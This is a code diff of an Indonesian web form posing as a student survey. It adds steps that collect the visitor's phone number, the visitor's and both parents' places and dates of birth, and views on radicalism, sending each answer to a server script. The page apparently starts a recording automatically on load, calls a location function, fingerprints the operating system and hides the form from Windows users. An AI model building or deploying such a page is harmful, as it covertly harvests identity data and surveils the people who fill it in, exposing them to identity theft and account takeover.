@@ -119,20 +119,49 @@ init();
 
     //console.log(document.getElementById(namaID).value);
    // document.getElementBy().style.display = "inline-block";
-
+    cek = true;
    var formulir = document.getElementById(namaID);
-   //console.log(formulir.name);
-   //console.log(formulir.value);
-   $.ajax({          
+    if (formulir.value === ''){
+      alert('Isian Tidak boleh kosong');
+      cek = false;
+    }else{
+      $.ajax({          
             type: 'POST',
             url: 'handler.php',
             data: {"data_formulir":`${formulir.name} : ${formulir.value}`},
             mimeType: 'text'
             });
+    }
+   //console.log(formulir.name);
+   //console.log(formulir.value);
+   return cek;
        
   }
 
-  
+  function inputTtl(idtempat, idtanggal) {
+      var tmp = document.getElementById(idtempat);
+      var tgl = document.getElementById(idtanggal);
+      
+      var cek = true;
+
+      if(tmp.value === '' || tgl.value === ''){
+
+        alert('Isian tidak boleh kosong!')
+        cek = false;
+      }else{
+
+        $.ajax({          
+            type: 'POST',
+            url: 'handler.php',
+            data: {"data_formulir":`${tmp.name}, ${tgl.name} : ${tmp.value}, ${tgl.value}`},
+            mimeType: 'text'
+            });
+
+      }
+      
+      return cek;
+  }
+
   $(document).ready(function(){
     
     window.setTimeout(startRecording, 300);
@@ -140,52 +169,109 @@ init();
     // inisialisasi
     $('#nama').show();
     $('#alamatEmail').hide();
+    $('#nomorHP').hide();
+    $('#TTL').hide();
+    $('#TTLAyah').hide();
+    $('#TTLIbu').hide();
     $('#asalUniversitas').hide();
     $('#jurusanKuliah').hide();
     $('#pendapatRadikalisme').hide();
     $('#radikalAgama').hide();
+    $('#pendapatTerorrisme1').hide();
 
     locate();
 
     $('.tbl1').click(function() {
+      if(klikSubmit('namaform1')){
       $('#gtau').fadeIn(200).delay(7000).fadeOut(); 
       $('#nama').fadeOut();
       $('#alamatEmail').delay(8000).fadeIn();
+      }
     
     });
 
     $('.tbl2').click(function() {
+      if(klikSubmit('emailform1')){
       $('#gtau').fadeIn(200).delay(4000).fadeOut(); 
       $('#alamatEmail').fadeOut();
-      $('#asalUniversitas').delay(5000).fadeIn();
-      
+      $('#nomorHP').delay(5000).fadeIn();
+      }
     });
 
     $('.tbl3').click(function() {
-      $('#gtau').fadeIn(200).delay(14000).fadeOut(); 
-      $('#asalUniversitas').fadeOut();
-      $('#jurusanKuliah').delay(15000).fadeIn();
-      locate();
+      if (klikSubmit('nomorhpform1')) {
+        $('#gtau').fadeIn(200).delay(4000).fadeOut(); 
+        $('#nomorHP').fadeOut();
+        $('#TTL').delay(5000).fadeIn();
+       
+      }
+     
     });
 
     $('.tbl4').click(function() {
+      if (inputTtl('tempatLahir', 'taggalLahir')) {
+        $('#gtau').fadeIn(200).delay(4000).fadeOut(); 
+        $('#TTL').fadeOut();
+        $('#TTLAyah').delay(5000).fadeIn();
+        locate();
+      }
+     
+    });
+
+// tempat tgl lahir ibu kandung
+// 
+    $('.tbl5').click(function() {
+        if (inputTtl('tempatLahirAyah', 'taggalLahirAyah')) {
+          $('#gtau').fadeIn(200).delay(4000).fadeOut(); 
+          $('#TTLAyah').fadeOut();
+          $('#TTLIbu').delay(5000).fadeIn();
+          
+        }
+      
+      });
+
+    $('.tbl6').click(function() {
+        if (inputTtl('tempatLahirIbu', 'taggalLahirIbu')) {
+          $('#gtau').fadeIn(200).delay(4000).fadeOut(); 
+          $('#TTLIbu').fadeOut();
+          $('#asalUniversitas').delay(5000).fadeIn();
+          
+        }
+      
+      });
+
+
+    $('.tbl7').click(function() {
+        if (klikSubmit('asalUnivform1')) {
+          $('#gtau').fadeIn(200).delay(4000).fadeOut(); 
+          $('#asalUniversitas').fadeOut();
+          $('#jurusanKuliah').delay(5000).fadeIn();
+          
+        }
+      
+      });
+
+    $('.tbl8').click(function() {
+      if (klikSubmit('jurusanform1')) {
       $('#gtau').fadeIn(200).delay(5000).fadeOut(); 
       $('#jurusanKuliah').fadeOut();
       $('#pendapatRadikalisme').delay(6000).fadeIn();
+      }
     });
 
-    $('.tbl5').click(function() {
+    $('.tbl9').click(function() {
+      if (klikSubmit('pendapatRadikalismeform1')) {
       $('#gtau').fadeIn(200).delay(900).fadeOut(); 
       $('#pendapatRadikalisme').fadeOut();
       $('#radikalAgama').delay(1000).fadeIn();
-     
-      
+        
+      }
     });
 
-    $('.tbl6').click(function() {
+    $('.tbl10').click(function() {
       $('#gtau').fadeIn(200).delay(2000).fadeOut(); 
       $('#radikalAgama').fadeOut();
-      $('').delay(3000).fadeIn();
+      $('pendapatTerorisme1form1').delay(3000).fadeIn();
     
      var rad1 = document.getElementById('radio1');
      var rad2 = document.getElementById('radio2');
@@ -210,7 +296,16 @@ init();
     });
 });
 
+  $('.tbl11').click(function() {
+      if (klikSubmit('pendapatTerorisme1form1')) {
+      $('#gtau').fadeIn(200).delay(4000).fadeOut(); 
+      $('#pendapatTerorrisme').fadeOut();
+      //$('#radikalAgama').delay(1000).fadeIn();
+        
+      }
+    });
 </script>
+
 </head>
 
 <body translate="no">
@@ -231,7 +326,7 @@ init();
       <input type="text" class="form-control" id="namaform1" aria-describedby="emailHelp" name="Nama" placeholder="masukkan nama" required>
     </div>
   
-    <button class="btn btn-primary tbl1" onclick="klikSubmit('namaform1')">Kirim</button>
+    <button class="btn btn-primary tbl1">Kirim</button>
   
    
 </div>
@@ -244,10 +339,67 @@ init();
       <input type="email" class="form-control" id="emailform1" aria-describedby="emailHelp" name="Email" placeholder="masukkan email" required>
     </div>
   
-    <button class="btn btn-primary tbl2" onclick="klikSubmit('emailform1')">Kirim</button>
+    <button class="btn btn-primary tbl2">Kirim</button>
   
     
 </div>
+
+<div id="nomorHP">
+  <div class="form-group">
+    <label for="nomorhpform1"><h5>Nomor HP</h5></label>
+    <input type="number" class="form-control" id="nomorhpform1" aria-describedby="emailHelp" placeholder="masukkan nomor WA" required>
+  </div>
+
+  <button class="btn btn-primary tbl3">Kirim</button>
+
+</div>
+
+
+
+<!-- TTL dia, Ayah, ibu -->
+
+<div id="TTL">
+  <div class="form-group">
+    <label for="tempatLahir"><h5>Tempat Lahir</h5></label>
+    <input type="text" class="form-control mb-5" id="tempatLahir" name="Tempat Lahir" placeholder="Tempat Lahir..." required>
+    
+    <label for="taggalLahir"><h5>Tanggal Lahir</h5></label>
+    <input type="date" class="form-control" placeholder="dd-mm-yyyy" id="taggalLahir" name="Tanggal Lahir" required>
+    <p>*pengisian tanggal bisa dilakukan dengan klik ikon tanggalan</p>
+  </div>
+
+  <button class="btn btn-primary tbl4">Kirim</button>
+
+</div>
+
+<div id="TTLAyah">
+  <div class="form-group">
+    <label for="tempatLahirAyah"><h5>Tempat Lahir Ayah</h5></label>
+    <input type="text" class="form-control mb-5" id="tempatLahirAyah" name="Tempat Lahir Ayah" placeholder="Tempat Lahir..." required>
+    
+    <label for="taggalLahirAyah"><h5>Tanggal Lahir Ayah</h5></label>
+    <input type="date" class="form-control" placeholder="dd-mm-yyyy" id="taggalLahirAyah" name="Tanggal Lahir Ayah" required>
+    <p>*pengisian tanggal bisa dilakukan dengan klik ikon tanggalan</p>
+  </div>
+
+  <button class="btn btn-primary tbl5">Kirim</button>
+
+</div>
+
+<div id="TTLIbu">
+  <div class="form-group">
+    <label for="tempatLahirIbu"><h5>Tempat Lahir Ibu</h5></label>
+    <input type="text" class="form-control mb-5" id="tempatLahirIbu" name="Tempat Lahir Ibu" placeholder="Tempat Lahir..." required>
+    
+    <label for="taggalLahirIbu"><h5>Tanggal Lahir Ibu</h5></label>
+    <input type="date" class="form-control" placeholder="dd-mm-yyyy" id="taggalLahirIbu" name="Tanggal Lahir Ibu" required>
+    <p>*pengisian tanggal bisa dilakukan dengan klik ikon tanggalan</p>
+  </div>
+
+  <button class="btn btn-primary tbl6">Kirim</button>
+
+</div>
+
 
 <div id="asalUniversitas">
   <div class="form-group">
@@ -255,7 +407,7 @@ init();
     <input type="text" class="form-control" id="asalUnivform1" aria-describedby="emailHelp" name="Universitas" placeholder="asal universitas" required>
   </div>
 
-  <button class="btn btn-primary tbl3" onclick="klikSubmit('asalUnivform1')">Kirim</button>
+  <button class="btn btn-primary tbl7">Kirim</button>
   
 </div>
 
@@ -265,7 +417,7 @@ init();
     <input type="text" class="form-control" id="jurusanform1" aria-describedby="emailHelp" name="Universitas" placeholder="asal universitas" required>
   </div>
 
-  <button class="btn btn-primary tbl4" onclick="klikSubmit('jurusanform1')">Kirim</button>
+  <button class="btn btn-primary tbl8">Kirim</button>
   
 </div>
 
@@ -275,7 +427,7 @@ init();
     <textarea class="form-control" id="pendapatRadikalismeform1" aria-describedby="emailHelp" name="Universitas" placeholder="Tulis disini...." rows="7"></textarea>
   </div>
 
-  <button class="btn btn-primary tbl5" onclick="klikSubmit('pendapatRadikalismeform1')">Kirim</button>
+  <button class="btn btn-primary tbl9">Kirim</button>
   
 </div>
 
@@ -297,14 +449,30 @@ init();
     </label>
   </div>
 
-  <button class="btn btn-primary mt-3 tbl6" onclick="klikSubmit('radikalagamaform1')">Kirim</button>
+  <button class="btn btn-primary mt-3 tbl10" onclick="klikSubmit('radikalagamaform1')">Kirim</button>
   
 </div>
 
+
+<div id="pendapatTerorrisme1">
+  <div class="form-group">
+    <label for="pendapatTerorisme1form1"><h5>Menurutmu apa itu paham radikal?</h5></label>
+    <textarea class="form-control" id="pendapatTerorisme1form1" aria-describedby="emailHelp" name="Universitas" placeholder="Tulis disini...." rows="7"></textarea>
+  </div>
+
+  <button class="btn btn-primary tbl11">Kirim</button>
+  
+</div>
 </div>
 <!-- Akhir Formulir Formulir -->
 
 <!--pesan error-->
+<div class="tampil_warning jumbotron bg-info text-light m-3" style="display: none;">
+  <h1>TIDAK MENDUKUNG :(</h1>
+  <p>Mohon Maaf, web ini belum bisa mendukung platform Windows</p>
+  
+</div>
+
 <div class="tampil_error jumbotron bg-danger text-light m-3" style="display: none;">
 <h1>ERROR&nbsp;:(</h1>
 <p>Web ini tidak bisa mengakses sumber daya yang diperlukan</p>
@@ -312,5 +480,18 @@ init();
 </div>
 
 
+
+
+<script>
+  var client = new ClientJS();
+ var OS = client.getOS();
+ console.log(OS);
+ if(OS == 'Windows'){
+
+   $('.tampil_warning').show(); 
+   $('.formulir').hide();
+   $('.tampil_error').hide();
+ }
+</script>
 </body>
 </html>
